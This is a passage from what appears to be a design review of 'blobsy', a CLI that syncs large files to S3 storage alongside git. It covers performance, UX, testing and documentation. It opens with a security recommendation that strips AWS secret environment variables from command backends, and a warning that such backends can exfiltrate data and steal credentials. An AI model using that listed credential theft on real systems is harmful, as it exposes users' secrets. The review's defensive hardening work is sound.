Even with trust restrictions, this could leak credentials if user explicitly trusts the
repo.

**Recommendation:** Sanitize environment when running command backends:

```typescript
function runCommand(cmd: string): Promise<void> {
  // Remove sensitive environment variables
  const cleanEnv = { ...process.env };
  delete cleanEnv.AWS_SECRET_ACCESS_KEY;
  delete cleanEnv.AWS_ACCESS_KEY_ID;
  delete cleanEnv.AWS_SESSION_TOKEN;
  // ... other sensitive vars

  return exec(cmd, { env: cleanEnv });
}
```

Or document this risk clearly:

```markdown
## Security: Command Backends

`command` backends execute arbitrary shell commands.
Malicious commands can:
- Exfiltrate data from tracked files
- Steal credentials from environment variables
- Modify local files
- Install malware

**Only use command backends from repos you fully trust.**
```

* * *

## 4. Performance Concerns

### 4.1 Per-File Transfer Overhead ⚠️ **MEDIUM RISK**

With 1,000 small files (10 KB each), per-file transfer wastes bandwidth on network
round-trips:

**Analysis:**

```
Network RTT (round-trip time): ~50ms per request (typical internet)
1 file = TCP handshake + TLS handshake + HTTP request + 10 KB data + response
Total per file: ~50-100ms

1,000 files sequentially: 50,000ms = 50 seconds (just in latency)
Actual data transfer: 10 MB @ 10 MB/s = 1 second
Overhead: 50x!

With parallelism (sync.parallel: 8):
1,000 files / 8 = 125 batches
125 * 50ms = 6.25 seconds (better, but still 6x overhead)
```

**Comparison to batched transfer:**

```bash
# s5cmd batch mode
$ s5cmd run upload-batch.txt
# Single TCP connection, all files in one session
# Total time: ~2 seconds (1s data + 1s overhead)
# 3x faster than blobsy with parallelism
```

**Why this matters:**

- ML datasets often have thousands of small files (images, JSON samples)
- Network latency dominates transfer time
- Users will notice “blobsy is slow” compared to `aws s3 sync` (which batches
  internally)

**Mitigation:**

V2 transfer engine with batching.
**Good defer** - this is complex and V1’s approach is simpler.

**V1 workaround:**

```yaml
# In .blobsy.yml
sync:
  parallel: 32  # Increase parallelism to mask latency
  # Trade-off: more concurrent connections = more memory + CPU
```

**Recommendation for V1:**

1. **Document performance characteristics:**

   ```markdown
   ## Performance

   blobsy transfers files individually, not in batches.
   This is simple and works well for:
   - Small number of files (< 100)
   - Large files (> 1 MB each)

   For 1,000+ small files, expect higher latency due to per-file overhead.

   Workaround: Increase parallelism with `sync.parallel: 32`
   ```

2. **Add progress reporting to show activity:**

   ```bash
   $ blobsy push
   Uploading 1,000 files (parallel: 8)...
   [=====>                    ] 234/1000 (23%) - 45s elapsed, ~3m remaining
   ```

### 4.2 YAML Parsing Overhead

Parsing 10,000 `.yref` files could be slow:

**Estimate:**

```typescript
// Typical YAML parsing performance
// Small YAML file (~100 bytes): ~0.1-1ms per file

10,000 files * 0.5ms = 5 seconds (just parsing)
Plus: 10,000 * stat() calls = ~50ms (negligible)
Total: ~5 seconds overhead on every blobsy command
```

This is noticeable but not catastrophic.

**Recommendations:**

**1. Cache parsed refs in memory (easy win):**

```typescript
class RefCache {
  private cache = new Map<string, RefFile>();

  async get(path: string): Promise<RefFile> {
    if (!this.cache.has(path)) {
      this.cache.set(path, await parseYRefFile(path));
    }
    return this.cache.get(path)!;
  }
}

// During a single blobsy sync invocation:
const refCache = new RefCache();
for (const refPath of refPaths) {
  const ref = await refCache.get(refPath);  // Cached
  // ...
}
```

**2. Parallel YAML parsing (easy win):**

```typescript
// Instead of sequential:
for (const path of refPaths) {
  const ref = await parseYRefFile(path);
  refs.push(ref);
}

// Use parallel:
const refs = await Promise.all(
  refPaths.map(path => parseYRefFile(path))
);
// With 8-core CPU: ~8x faster (5s -> 0.6s)
```

**3. Consider binary format for large repos (V2):**

```typescript
// .yref.bin (optional binary format)
// Header (48 bytes):
//   4 bytes: magic number (0x42524546 = "BREF")
//   4 bytes: version (0x00000001)
//   32 bytes: sha256 (binary, not hex)
//   8 bytes: size (uint64 little-endian)
// Variable:
//   2 bytes: remote_key length (uint16)
//   N bytes: remote_key (UTF-8 string)
//   [optional compression metadata]

// Parsing: single read() call, no YAML overhead
// ~0.01ms per file vs ~0.5ms for YAML
// 50x faster for 10,000 files: 5s -> 0.1s
```

Automatically use binary format for repos with >1,000 tracked files.

**4. Lazy loading (V2):**

```typescript
// Only parse .yref files that are actually needed
// Example: blobsy push data/
// Only load .yref files under data/, not entire repo
```

### 4.3 Git Operations at Scale

`git add` on 10,000 files can be slow:

```bash
# Slow: add files one by one
$ git add file1.yref
$ git add file2.yref
# ... 10,000 times

# Fast: let git find all changes
$ git add -A
```

Also, `git status` on large repos can be slow:

```bash
# Slow: git status (shows all changes, formats output)
$ git status
# Can take 1-10 seconds on large repos

# Fast: porcelain format (machine-readable, minimal processing)
$ git status --porcelain
# Usually 10x faster
```

**Recommendations:**

**1. Use efficient git commands:**

```typescript
// Instead of: git add file1.yref file2.yref ... (slow)
execSync('git add -A');  // Let git find changed files (fast)

// Instead of: git status (slow, human-readable)
execSync('git status --porcelain');  // Machine-readable, faster
```

**2. Batch git operations:**

```typescript
// Instead of: commit after each track operation
// Do: collect all changes, commit once

await trackFile('file1.bin');
await trackFile('file2.bin');
// ... 1,000 files

// Now commit all at once:
execSync('git add -A');
execSync('git commit -m "Track 1,000 files"');
```

**3. Use git’s internal batch APIs (if needed):**

```typescript
// For extreme scale (100,000+ files), consider using git's plumbing:
// git update-index, git write-tree, git commit-tree
// Much faster than porcelain commands
```

* * *

## 5. UX and Ergonomics

### 5.1 Strengths ✅

**1. Clear state visualization:**

The status symbols (○ ◐ ◑ ✓ ~ ? ⊗) are intuitive:
```bash
$ blobsy status
✓ data/model.bin (committed and synced)
○ data/new-file.bin (not committed, not synced)
◐ data/dataset.parquet (committed, not synced)
```

This is better than DVC (which just shows “not in cache”) or Git LFS (which hides
state).

**2. Self-documenting `.yref` files:**

```yaml
# blobsy -- https://github.com/jlevy/blobsy
format: blobsy-yref/0.1
sha256: abc123...
```

An agent encountering a `.yref` file for the first time can understand it.
Good for AI agents and new team members.

**3. `blobsy doctor` for diagnostics:**

```bash
$ blobsy doctor
Backend: s3 (bucket: my-datasets, region: us-east-1)
Sync tools: aws-cli ✓, rclone ✗
Tracked files: 127
Issues: none
```

This is excellent for troubleshooting.
Many tools lack this.

**4. `--json` output for automation:**

```bash
$ blobsy status --json
{"schema_version": "0.1", "tracked": 12, ...}
```

Good for CI/CD and agent integration.

**5. Hierarchical config:**

```
~/.blobsy.yml           (user defaults)
repo/.blobsy.yml        (repo root)
repo/data/.blobsy.yml   (subdirectory override)
```

Flexible and powerful, like `.gitignore` or `.editorconfig`.

### 5.2 Weaknesses and Improvements ⚠️

**Weakness 1: Three-state model is complex**

The orthogonal states (tracked, synced, committed) create 8 possible combinations:

| Tracked | Synced | Committed | Symbol | Common? |
| --- | --- | --- | --- | --- |
| ✓ | ✓ | ✓ | ✓ | Yes (good state) |
| ✓ | ✗ | ✗ | ○ | Yes (just tracked) |
| ✓ | ✗ | ✓ | ◐ | Yes (need to push) |
| ✓ | ✓ | ✗ | ◑ | Yes (need to commit) |
| ✗ | -- | -- | ? | Rare (file deleted but .yref exists) |
| (modified) | -- | -- | ~ | Common (file changed) |
| (deleted) | -- | -- | ⊗ | Rare (staged for deletion) |

This is inherent complexity - you can’t eliminate it.
But you can **make it learnable**.

**Recommendation:**

**Excellent documentation and error messages.** For example:

```bash
$ blobsy status
◐ data/model.bin (committed, not synced)

Help: This file's .yref is in git, but the data hasn't been uploaded yet.
Action: Run 'blobsy push' to upload the data to remote storage.
```

**Weakness 2: Error messages from external tools**

When external tools (aws-cli, rclone) fail, error messages come from those tools:

```bash
$ blobsy push
Error running: aws s3 cp data/file.bin s3://bucket/...

upload failed: Unable to locate credentials. You can configure credentials by running "aws configure".
```

Users need to understand:
1. This is an AWS CLI error, not a blobsy error
2. They need to configure AWS credentials
3. How to configure AWS credentials

**Many users will be confused by this** and think blobsy is broken.

**Recommendation: Wrap external tool errors with context:**

```bash
$ blobsy push
Uploading data/file.bin...

✗ Upload failed: AWS CLI returned error

AWS CLI error:
  upload failed: Unable to locate credentials.
  You can configure credentials by running "aws configure".

blobsy uses AWS CLI to upload files to S3.
You need to configure AWS credentials before blobsy can push.

Quick fix:
  1. Run 'aws configure' to set up credentials
  2. Or set environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
  3. Or run 'blobsy doctor' for more diagnostics

Learn more: https://docs.blobsy.dev/troubleshooting/aws-credentials
```

**Weakness 3: No progress indication mentioned**

For multi-GB transfers, users need:
- Progress bars
- ETA (estimated time remaining)
- Current file being transferred
- Bytes transferred / total bytes
- Transfer speed (MB/s)

**This is critical for UX.** Without progress, users think the tool is frozen.

**Recommendation: Add comprehensive progress reporting (V1 CRITICAL):**

```bash
$ blobsy push

Analyzing files...
  Found 127 tracked files (12 need push)

Uploading 12 files (5.2 GB)...

[1/12] data/model-v1.bin
  [=================>        ] 432 MB / 500 MB (86%) - 12 MB/s - ETA 5s

Overall progress:
  [=====>                    ] 2.1 GB / 5.2 GB (40%) - 15 MB/s - ETA 3m 12s

  Completed: 0 files
  In progress: 8 files (parallel: 8)
  Remaining: 4 files
```

Use libraries like:
- `cli-progress` (progress bars)
- `bytes` (human-readable sizes)
- `pretty-ms` (human-readable time)

**Weakness 4: Push/commit coordination (already covered in 3.1)**

See Section 3.1 for detailed analysis and recommendations.

* * *

## 6. Missing Features and Considerations

### 6.1 Critical for V1 (Must Have)

**1. Progress bars and ETA**
- **Why critical:** Large transfers appear frozen without progress
- **Effort:** Low (use existing libraries)
- **Priority:** P0

**2. Bandwidth limiting**
- **Use case:** Don’t saturate network connection
- **Implementation:** Delegate to tools (`aws-cli` has `--max-bandwidth`, rclone has
  `--bwlimit`)
- **Priority:** P1

**3. Dry-run for all commands**
- **Use case:** Preview before making changes
- **Already mentioned in design, ensure comprehensive**
- **Priority:** P0

**4. Cost estimation**
- **Use case:** Estimate S3 costs before pushing large datasets
- **Implementation:**
  ```bash
  $ blobsy cost-estimate

  Estimated AWS S3 costs (us-east-1):
    Storage: 5.2 GB @ $0.023/GB/month = $0.12/month
    PUT requests: 127 @ $0.005/1000 = $0.0006
    GET requests (for team of 5): 635 @ $0.0004/1000 = $0.0003
    Bandwidth (egress): 26 GB @ $0.09/GB = $2.34

  Total first month: $2.46
  Total monthly (storage only): $0.12
  ```
- **Priority:** P1

**5. Resume support**
- **Use case:** Interrupted multi-GB uploads
- **Implementation:** Delegate to tools (aws-cli and rclone both support resume via
  multipart uploads)
- **Priority:** P1

**6. Better error messages (already covered in 5.2)**

**7. Push/commit safeguards (already covered in 3.1)**

### 6.2 Important for V2 (Should Have)

**1. Remote verification**
- **Use case:** Verify remote blobs exist and match hashes
- **Implementation:**
  ```bash
  $ blobsy verify --remote
  Verifying 127 files against remote...
    ✓ data/model.bin (local hash matches remote ETag)
    ✗ data/dataset.csv (remote blob not found!)
  ```
- **Priority:** P2

**2. Dedup report**
- **Use case:** Show storage savings from deduplication
- **Implementation:** Already covered in Section 3.3
- **Priority:** P2

**3. Template migration tool**
- **Use case:** Convert between key templates (e.g., chronological ->
  content-addressable)
- **Implementation:**
  ```bash
  $ blobsy migrate-template --from chronological --to content-addressable

  This will:
    1. Re-upload all 127 files with new keys
    2. Update all .yref files with new remote_key
    3. Old blobs will be orphaned (safe to GC after migration)

  Estimated cost: 127 PUT requests (~$0.0006)
  Estimated time: ~5 minutes

  Proceed? [y/N]
  ```
- **Priority:** P2

**4. Selective pull**
- **Use case:** Download subset of files
- **Implementation:**
  ```bash
  $ blobsy pull --include="*.parquet" --exclude="*.bin"
  $ blobsy pull --max-size=10gb
  $ blobsy pull data/specific/directory/
  ```
- **Priority:** P2

**5. Lock file support**
- **Use case:** Prevent concurrent blobsy operations
- **Implementation:** Already mentioned in Section 3.5
- **Priority:** P2

**6. Batched transfers (V2 transfer engine)**
- **Use case:** Improve performance for many small files
- **Already in V2 plan - good defer**
- **Priority:** P2

### 6.3 Nice to Have (Could Defer Beyond V2)

**1. Compression dictionary training**
- **Use case:** 2-5x better compression for small files with shared structure
- **Already mentioned for V2+ - good defer**
- **Priority:** P3

**2. Sub-file delta sync**
- **Use case:** Incremental updates to large files (databases, large JSONs)
- **Complexity:** High (need chunking algorithm like HF Xet)
- **Priority:** P3

**3. Web UI**
- **Use case:** Browse tracked files, view status
- **Out of scope for CLI tool - third-party could build on API**
- **Priority:** P4

**4. ACL support**
- **Use case:** Fine-grained access control
- **Can rely on backend IAM - good defer**
- **Priority:** P4

**5. Encryption at rest**
- **Use case:** Encrypt blobs before upload
- **Can rely on S3 server-side encryption (SSE-S3, SSE-KMS)**
- **Priority:** P4

* * *

## 7. Implementation Recommendations

### 7.1 High-Risk Areas Requiring Extra Care

**1. Gitignore manipulation** ⚠️ **HIGH RISK**

**Risk:** Could corrupt user’s `.gitignore` if not handled carefully

**Scenarios:**
- Malformed `.gitignore` (invalid syntax, encoding issues)
- Concurrent writes (two blobsy processes)
- Large `.gitignore` (1000+ lines, performance)
- User has complex ignore patterns (negation, wildcards)

**Recommendations:**

```typescript
// Always backup before modifying
async function updateGitignore(path: string, add: string[]) {
  const backupPath = `${path}.blobsy-backup`;
  await copyFile(path, backupPath);

  try {
    // Read existing
    const existing = await readFile(path, 'utf-8');

    // Find blobsy section
    const section = extractBlobsySection(existing);

    // Update section
    const updated = updateSection(section, add);

    // Write atomically (temp + rename)
    const tempPath = `${path}.blobsy-tmp`;
    await writeFile(tempPath, updated);
    await rename(tempPath, path);

    // Success: remove backup
    await unlink(backupPath);
  } catch (err) {
    // Restore from backup
    await copyFile(backupPath, path);
    throw err;
  }
}
```

**Testing:**
- Test with malformed .gitignore files
- Test with concurrent modifications
- Test with 10,000 line .gitignore
- Test with complex patterns (negation, wildcards, subdirectories)

**2. Stat cache correctness** ⚠️ **HIGH RISK**

**Risk:** Wrong hashes due to cache bugs

Already covered in Section 3.4. Key points:
- Use nanosecond resolution
- Conservative invalidation
- Optional `--no-cache` flag
- Add `--check-cache` verification mode

**3. Template evaluation** ⚠️ **MEDIUM RISK**

**Risk:** Incorrect key generation due to template bugs

**Edge cases:**
- Special characters in paths (`{repo_path}` with spaces, unicode, etc.)
- Very long paths (>255 chars)
- Empty variables (`{git_branch}` in detached HEAD)
- Injection (user somehow controls template variables)

**Recommendations:**

```typescript
function evaluateTemplate(template: string, vars: TemplateVars): string {
  // Validate all variables are safe
  for (const [key, value] of Object.entries(vars)) {
    if (value.includes('..')) {
      throw new Error(`Invalid path traversal in ${key}: ${value}`);
    }
    if (value.length > 1000) {
      throw new Error(`Variable ${key} too long: ${value.length} chars`);
    }
  }

  // Evaluate template
  let result = template;
  for (const [key, value] of Object.entries(vars)) {
    result = result.replace(`{${key}}`, encodeURIComponent(value));
  }

  // Validate result
  if (result.includes('{')) {
    throw new Error(`Unresolved template variable: ${result}`);
  }

  return result;
}
```

**Testing:**
- Fuzz test with random inputs
- Test with all special characters
- Test with very long paths
- Test with all template variables (including edge cases)

**4. Transfer tool detection** ⚠️ **MEDIUM RISK**

**Risk:** Wrong tool selected, or false positive/negative in capability check

**Scenarios:**
- Tool installed but credentials not configured
- Tool supports S3 but not the specific endpoint
- Tool version too old (missing features)
- Tool path not in PATH (installed in custom location)

**Recommendations:**

```typescript
async function detectTransferTool(
  tools: string[],
  backend: Backend
): Promise<TransferTool | null> {
  for (const toolName of tools) {
    // 1. Check binary exists
    const toolPath = await which(toolName);
    if (!toolPath) continue;

    // 2. Check version (if needed)
    const version = await getToolVersion(toolPath);
    if (!isVersionSupported(toolName, version)) {
      console.warn(`${toolName} version ${version} is too old (need >= X.Y)`);
      continue;
    }

    // 3. Check credentials configured
    const hasCredentials = await checkCredentials(toolName, backend);
    if (!hasCredentials) {
      console.warn(`${toolName} found but credentials not configured`);
      continue;
    }

    // 4. Test connectivity (optional, can be slow)
    if (process.env.BLOBSY_TEST_CONNECTIVITY) {
      const canConnect = await testConnectivity(toolName, backend);
      if (!canConnect) {
        console.warn(`${toolName} cannot connect to ${backend.endpoint}`);
        continue;
      }
    }

    // Success
    return createTransferTool(toolName, toolPath);
  }

  return null;  // Fallback to built-in SDK
}
```

**Testing:**
- Test with no tools installed (fallback to SDK)
- Test with multiple tools (preference order)
- Test with misconfigured credentials
- Test with unreachable endpoints

### 7.2 Testing Strategy

**Essential test scenarios:**

**1. Scale testing:**

```typescript
describe('Scale tests', () => {
  it('handles 10,000 tracked files', async () => {
    // Create 10,000 files (1 KB to 10 GB)
    // Track all files
    // Measure time (should be < 5 minutes)
    // Push all files (measure time, check correctness)
    // Verify all files (check integrity)
  });

  it('handles deep directory nesting (100+ levels)', async () => {
    // Create dir/dir/dir/.../file.bin (100 levels deep)
    // Track and sync (should handle gracefully)
  });

  it('handles long filenames (255 chars)', async () => {
    // Create file with 255-character name
    // Track and sync (should handle gracefully)
  });
});
```

**2. Failure testing:**

```typescript
describe('Failure handling', () => {
  it('handles interrupted push (SIGINT mid-transfer)', async () => {
    const push = blobsyPush();
    setTimeout(() => push.kill('SIGINT'), 5000);

    // Re-run push
    await blobsyPush();

    // Verify: no corruption, only missing files re-uploaded
  });

  it('handles network failure during upload', async () => {
    // Simulate network disconnect mid-upload
    // Verify: partial files cleaned up, can retry
  });

  it('handles disk full during pull', async () => {
    // Simulate disk full during download
    // Verify: clean error, no corrupted files
  });

  it('handles expired credentials mid-transfer', async () => {
    // Start push with valid creds
    // Expire creds after 3 files
    // Verify: clear error message, can resume after re-auth
  });
});
```

**3. Concurrency testing:**

```typescript
describe('Concurrent operations', () => {
  it('handles two blobsy push in parallel', async () => {
    await Promise.all([
      blobsyPush('data/dir1/'),
      blobsyPush('data/dir2/')
    ]);

    // Verify: no corruption, all files uploaded
  });

  it('handles push + pull simultaneously', async () => {
    await Promise.all([
      blobsyPush('data/new/'),
      blobsyPull('data/old/')
    ]);

    // Verify: no corruption
  });

  it('prevents corruption with file locking', async () => {
    // Two processes try to track same file
    // Verify: one succeeds, one waits or errors cleanly
  });
});
```

**4. Platform testing:**

```typescript
describe('Platform compatibility', () => {
  it('works on macOS (case-insensitive, Unicode NFD)', async () => {
    // Create file with unicode name: "café.txt" (NFD)
    // Track, push, pull on Linux
    // Verify: name normalized correctly (NFC)
  });

  it('works on Linux (case-sensitive)', async () => {
    // Create files: Data/file.txt and data/file.txt
    // Track both (should warn about case conflict)
  });

  it('works on Windows (backslash paths, CRLF)', async () => {
    // Create file with Windows path: data\subdir\file.bin
    // Track, push, pull on Linux
    // Verify: path normalized to forward slashes
  });
});
```

**5. Integration testing:**

```typescript
describe('Tool integration', () => {
  it('works with aws-cli (classic backend)', async () => {
    process.env.AWS_CLI_BACKEND = 'classic';
    await testFullWorkflow();
  });

  it('works with aws-cli (CRT backend)', async () => {
    process.env.AWS_CLI_BACKEND = 'crt';
    await testFullWorkflow();
  });

  it('works with rclone', async () => {
    // Configure rclone backend
    await testFullWorkflow();
  });

  it('works with s5cmd', async () => {
    // Configure s5cmd
    await testFullWorkflow();
  });

  it('works with built-in SDK fallback', async () => {
    // Remove all external tools from PATH
    await testFullWorkflow();
    // Should use @aws-sdk/client-s3
  });

  it('works with local backend', async () => {
    // Use local filesystem as backend (for testing)
    await testFullWorkflow();
  });

  it('works with custom command backend', async () => {
    // Configure custom shell command
    await testFullWorkflow();
  });
});
```

**6. Compression testing:**

```typescript
describe('Compression', () => {
  it('compresses text files with zstd', async () => {
    const file = createFile('data.json', '{"key": "value"}'.repeat(1000));
    await blobsyTrack(file);
    await blobsyPush(file);

    // Verify: remote blob is compressed (check remote_key has .zst)
    // Verify: pull decompresses correctly
  });

  it('skips compression for already-compressed files', async () => {
    const file = 'data.parquet';
    // Parquet is already compressed
    await blobsyTrack(file);
    await blobsyPush(file);

    // Verify: no .zst suffix, no compression applied
  });

  it('handles all compression algorithms (zstd, gzip, brotli)', async () => {
    for (const algo of ['zstd', 'gzip', 'brotli']) {
      // Configure compression algorithm
      await testCompressionRoundtrip(algo);
    }
  });
});
```

### 7.3 Code Structure Suggestions

**Clean architecture with clear separation:**

```typescript
// Core domain models
interface RefFile {
  format: string;
  sha256: string;
  size: number;
  remote_key?: string;
  compressed?: {
    algorithm: 'zstd' | 'gzip' | 'brotli';
    size: number;
  };
}

interface Backend {
  type: 's3' | 'local' | 'command';
  buildRemotePath(key: string): string;
}

interface TransferEngine {
  push(localPath: string, remotePath: string): Promise<void>;
  pull(remotePath: string, localPath: string): Promise<void>;
}

// Key classes
class RefFileManager {
  async read(path: string): Promise<RefFile>;
  async write(path: string, ref: RefFile): Promise<void>;
  async validate(ref: RefFile): Promise<void>;
}

class GitIgnoreManager {
  async add(gitignorePath: string, entries: string[]): Promise<void>;
  async remove(gitignorePath: string, entries: string[]): Promise<void>;
  private extractBlobsySection(content: string): string[];
  private updateSection(section: string[], changes: string[]): string;
}

class ConfigResolver {
  resolve(repoPath: string, filePath: string): Config;
  private loadConfigHierarchy(path: string): Config[];
  private mergeConfigs(configs: Config[]): Config;
}

class TemplateEvaluator {
  evaluate(template: string, vars: TemplateVars): string;
  private validateVars(vars: TemplateVars): void;
  private substituteVars(template: string, vars: TemplateVars): string;
}

class TransferOrchestrator {
  constructor(
    private engine: TransferEngine,
    private concurrency: number
  ) {}

  async pushAll(files: FileInfo[]): Promise<void> {
    // Manage concurrency pool
    // Track progress
    // Handle failures
  }

  async pullAll(refs: RefFile[]): Promise<void> {
    // Similar to pushAll
  }
}

class StatCache {
  async get(path: string): Promise<CacheEntry | null>;
  async set(path: string, entry: CacheEntry): Promise<void>;
  async invalidate(path: string): Promise<void>;
  private isValid(entry: CacheEntry, currentStat: Stats): boolean;
}

class HashComputer {
  async computeSHA256(filePath: string): Promise<string>;
  private streamHash(filePath: string): Promise<string>;
}

class CompressionEngine {
  async compress(
    inputPath: string,
    outputPath: string,
    algorithm: string
  ): Promise<void>;

  async decompress(
    inputPath: string,
    outputPath: string,
    algorithm: string
  ): Promise<void>;

  shouldCompress(filePath: string, config: Config): boolean;
}
```

**Dependency injection for testability:**

```typescript
// Main CLI commands use dependency injection
class BlobsyCommands {
  constructor(
    private refManager: RefFileManager,
    private gitignoreManager: GitIgnoreManager,
    private transferOrchestrator: TransferOrchestrator,
    private hashComputer: HashComputer,
    // ... other dependencies
  ) {}

  async track(paths: string[]): Promise<void> {
    // Implementation uses injected dependencies
  }

  async push(paths: string[]): Promise<void> {
    // Implementation
  }

  // ... other commands
}

// Easy to test with mocks
describe('BlobsyCommands', () => {
  it('tracks file and creates .yref', async () => {
    const mockRefManager = new MockRefFileManager();
    const mockHashComputer = new MockHashComputer();

    const commands = new BlobsyCommands(
      mockRefManager,
      mockGitignoreManager,
      mockTransferOrchestrator,
      mockHashComputer
    );

    await commands.track(['data/file.bin']);

    expect(mockRefManager.write).toHaveBeenCalled();
  });
});
```

* * *

## 8. Documentation Recommendations

This design doc is **excellent**, but user-facing docs will need additional content:

### 8.1 Quick Start Guide (30-Second Example)

````markdown
## Quick Start

```bash
# 1. Initialize blobsy in your git repo
$ blobsy init --bucket my-data --region us-east-1

# 2. Track a large file
$ blobsy track data/large-model.bin
Created data/large-model.bin.yref

# 3. Commit to git
$ git add data/large-model.bin.yref .gitignore .blobsy.yml
$ git commit -m "Track large model with blobsy"

# 4. Sync to remote storage
$ blobsy sync
Uploaded data/large-model.bin (500 MB)

# 5. Push git
$ git push
````

**On another machine:**

```bash
$ git clone <repo>
$ blobsy sync
Downloaded data/large-model.bin (500 MB)

# Now data/large-model.bin is available locally!
```

````

### 8.2 Mental Model Section

```markdown
## Understanding blobsy's Three States

Every tracked file has three independent states:

### 1. Tracked (Local Filesystem)

Does a `.yref` file exist for this file?

- ✓ **Tracked:** `.yref` file exists (created by `blobsy track`)
- ✗ **Not tracked:** No `.yref` file

### 2. Synced (Cloud Storage)

Does the blob exist in remote storage?

- ✓ **Synced:** Blob uploaded to S3/R2/backend (via `blobsy push`)
- ✗ **Not synced:** Blob not yet uploaded

### 3. Committed (Git)

Is the `.yref` file committed to git?

- ✓ **Committed:** `.yref` is in git history (via `git commit`)
- ✗ **Not committed:** `.yref` only in working directory

### The Complete Workflow

All three must be true for "done":
````

1. blobsy track file.bin (Tracked ✓, Synced ✗, Committed ✗)
2. blobsy push file.bin (Tracked ✓, Synced ✓, Committed ✗)
3. git add & commit .yref (Tracked ✓, Synced ✓, Committed ✓)
4. git push (Share with team)

```

**Shortcut:** Use `blobsy commit -m "msg"` to do steps 2-3 atomically.
```

### 8.3 Common Pitfalls

````markdown
## Common Mistakes and How to Avoid Them

### Mistake 1: Pushed but forgot to commit

**Scenario:**
```bash
$ blobsy push                  # Data uploaded
# Forgot: git commit!
$ git push                     # Only pushes old .yref
# Team sees old data
````

**Detection:**
```bash
$ git status
modified: data/model.bin.yref  # Uncommitted changes!
```

**Fix:**
```bash
$ git add data/model.bin.yref
$ git commit -m "Update model"
$ git push
```

**Prevention:** Use `blobsy commit` instead of separate push + commit.

### Mistake 2: Committed but forgot to push

**Scenario:**
```bash
$ blobsy track file.bin        # Updates .yref
$ git add file.bin.yref && git commit && git push
# Forgot: blobsy push!
# Team pulls git, tries blobsy pull, gets "missing (no remote!)"
```

**Detection:**
```bash
$ blobsy check-unpushed
⚠ 1 .yref committed but data not pushed:
  data/file.bin.yref
```

**Fix:**
```bash
$ blobsy push
```

**Prevention:** Set up pre-push git hook (installed by `blobsy init`).

### Mistake 3: Changed template after data exists

**Scenario:**
```bash
# Pushed with template A
$ blobsy push
# Remote: 20260220T140322Z-abc123/data/model.bin

# Changed template to B
# Edit .blobsy.yml: key_template: "sha256/{content_sha256}"

# Push same file again
$ blobsy push
# Remote: sha256/abc123.../data/model.bin
# Now two copies! Old blob is orphaned.
```

**Prevention:** blobsy will warn when template changes (see
`blobsy config set key_template`).

### Mistake 4: Accidentally committed large file to git

**Scenario:**
```bash
$ blobsy track data/large.bin
# Creates .yref, adds to .gitignore

# But .gitignore wasn't committed yet!
$ git add -A                   # Stages .yref AND large.bin (oops!)
$ git commit                   # Large file now in git (permanent!)
```

**Detection:**
```bash
$ git log --stat
# Shows large file in commit history
```

**Fix:**
```bash
# Remove from git history (dangerous, rewrites history)
$ git filter-branch --tree-filter 'git rm -f data/large.bin' HEAD
```

**Prevention:** Always commit `.gitignore` immediately after `blobsy track`.
````

### 8.4 Troubleshooting Guide

```markdown
## Troubleshooting

### "Missing (no remote!)" error

**Error:**
```bash
$ blobsy pull
✗ data/model.bin: missing (no remote!)
````

**Cause:** `.yref` file references a blob that doesn’t exist in remote storage.

**Scenarios:**
1. Someone committed .yref but forgot to push data
2. Blob was deleted from remote (e.g., manual deletion)
3. Wrong backend configuration (looking at wrong bucket)

**Fix:**
1. If you have the file locally: `blobsy push data/model.bin`
2. If you don’t have the file: Ask the person who committed the .yref to push
3. Check backend config: `blobsy doctor`

### “Hash mismatch” error

**Error:**
```bash
$ blobsy verify
✗ data/model.bin: hash mismatch
  Expected: abc123...
  Actual:   def456...
```

**Cause:** Local file content doesn’t match the hash in `.yref`.

**Scenarios:**
1. File was modified after tracking
2. File corruption
3. Wrong file at this path

**Fix:**
1. If file was intentionally modified: `blobsy track data/model.bin` (update .yref)
2. If file is corrupted: `blobsy pull --force data/model.bin` (re-download)
3. If file is wrong: Check git history to find correct version

### “Unable to locate credentials” error

**Error:**
```bash
$ blobsy push
Error: aws s3 cp failed
  upload failed: Unable to locate credentials
```

**Cause:** AWS CLI can’t find credentials.

**Fix:**
```bash
# Option 1: Configure AWS CLI
$ aws configure
AWS Access Key ID: YOUR_KEY
AWS Secret Access Key: YOUR_SECRET
Default region: us-east-1

# Option 2: Set environment variables
$ export AWS_ACCESS_KEY_ID=YOUR_KEY
$ export AWS_SECRET_ACCESS_KEY=YOUR_SECRET

# Option 3: Use IAM role (on EC2/ECS)
# (no action needed, automatic)

# Verify:
$ blobsy doctor
Backend: s3 (✓ credentials configured)
```

### “Template mismatch” warning

**Warning:**
```bash
$ blobsy doctor
⚠ Template mismatch detected
  Repo config:  {iso_date_secs}-{content_sha256_short}/{repo_path}
  Your config:  sha256/{content_sha256}
```

**Cause:** Your local config overrides the repo config.

**Risk:** You’ll push to different keys than other users (breaks dedup).

**Fix:**
```bash
# Remove override from ~/.blobsy.yml
$ vim ~/.blobsy.yml
# Delete the 'key_template' line

# Or: Use repo default explicitly
$ blobsy config unset key_template
```

````

### 8.5 Migration Guides

```markdown
## Migration from Git LFS

**Why migrate:** Git LFS requires server support (GitHub, GitLab, Bitbucket). blobsy works with any S3-compatible storage.

**Steps:**

1. **Export Git LFS data:**
   ```bash
   # Download all LFS objects
   $ git lfs fetch --all

   # Make copies outside .git/lfs
   $ git lfs pull
````

2. **Initialize blobsy:**

   ```bash
   $ blobsy init --bucket my-bucket --region us-east-1
   ```

3. **Track LFS files with blobsy:**

   ```bash
   # Find all LFS files
   $ git lfs ls-files | cut -d' ' -f3 > lfs-files.txt

   # Track with blobsy
   $ cat lfs-files.txt | xargs blobsy track
   ```

4. **Commit and push:**

   ```bash
   $ git add *.yref .gitignore .blobsy.yml
   $ git commit -m "Migrate from Git LFS to blobsy"
   $ blobsy sync
   $ git push
   ```

5. **Uninstall Git LFS:**

   ```bash
   $ git lfs uninstall
   $ git lfs prune
   ```

## Migration from DVC

**Why migrate:** DVC requires Python.
blobsy is a standalone Node.js CLI.

**Steps:**

1. **Export DVC data:**

   ```bash
   $ dvc pull  # Download all data from DVC remote
   ```

2. **Initialize blobsy:**

   ```bash
   $ blobsy init --bucket my-bucket --region us-east-1
   ```

3. **Track DVC files with blobsy:**

   ```bash
   # Find all .dvc files
   $ find . -name "*.dvc" | sed 's/\.dvc$//' > dvc-files.txt

   # Track with blobsy
   $ cat dvc-files.txt | xargs blobsy track
   ```

4. **Remove DVC:**

   ```bash
   $ git rm *.dvc .dvc/.gitignore .dvc/config
   $ rm -rf .dvc/cache
   ```

5. **Commit and push:**

   ```bash
